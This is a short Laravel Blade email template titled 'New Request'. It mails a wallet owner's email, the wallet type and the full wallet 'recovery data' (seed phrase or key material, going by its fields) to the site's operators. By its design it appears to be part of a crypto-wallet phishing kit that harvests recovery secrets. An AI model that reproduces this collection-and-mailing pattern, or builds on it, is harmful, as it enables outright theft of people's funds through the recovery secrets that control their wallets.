@component('mail::message')
# New Request

##Wallet owner: {{$user->email}}
###Recovery data type:{{ucfirst($type)}}<br/>
##Wallet Type: {{strtoupper($wallet_type)}}<br/>
###Recovery Data ({{$type}}): <br/>{{$recovery_data}}


Thanks,<br>
{{ config('app.name') }}
@endcomponent
